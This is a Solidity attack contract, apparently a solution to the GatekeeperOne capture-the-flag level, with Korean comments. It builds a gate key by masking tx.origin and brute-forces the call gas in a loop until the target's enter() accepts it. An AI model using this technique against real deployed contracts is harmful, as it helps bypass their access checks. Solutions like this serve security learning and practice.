// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    IGatekeeperOne target;
    
    constructor(address _target) {
        target = IGatekeeperOne(_target);
    }

    function attack() public {
        // gateKey 생성
        // 하위 2바이트: tx.origin의 하위 2바이트
        // 중간 2바이트: 0x0000
        // 상위 4바이트: tx.origin의 상위 4바이트 (0이 아닌 값 보장)
        bytes8 key = bytes8(
            uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF
        );

        // gas brute force
        for (uint256 i = 0; i < 8191; i++) {
            (bool ok, ) = address(target).call{gas: 8191 * 10 + i}(
                abi.encodeWithSelector(
                    target.enter.selector,
                    key
                )
            );

            if (ok) {
                break;
            }
        }
    }
}
